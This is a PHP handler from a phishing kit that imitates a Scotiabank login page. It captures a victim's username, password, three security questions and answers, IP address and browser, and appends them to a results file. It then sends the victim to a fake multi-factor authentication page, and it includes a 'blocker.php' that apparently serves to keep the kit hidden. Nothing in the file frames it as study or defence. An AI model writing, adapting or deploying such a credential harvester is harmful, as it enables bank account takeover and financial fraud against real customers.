<?php
error_reporting(0);
include('blocker.php');

$message .= "Mp3=============================================\n";
$message .= "SCOTIAlogin 1 : ".$ip."\n";
$message .= "------------------------------------------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "------------------------------------------------\n";
$message .= "Question 1 : ".$_POST['question1']."\n";
$message .= "Answer 1   : ".$_POST['answer1']."\n";
$message .= "Question 2 : ".$_POST['question2']."\n";
$message .= "Answer 2   : ".$_POST['answer2']."\n";
$message .= "Question 3 : ".$_POST['question3']."\n";
$message .= "Answer 3   : ".$_POST['answer3']."\n";
$message .= "------------------------------------------------\n";
$message .= "BROWSER : ".$browser."\n";$browser=$_POST['browser'];
$message .= "Mp3=============================================\n";

$fp = fopen('../../../ALLResults.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<script>
    window.top.location.href = "mfaAuthentication2.html";
</script>
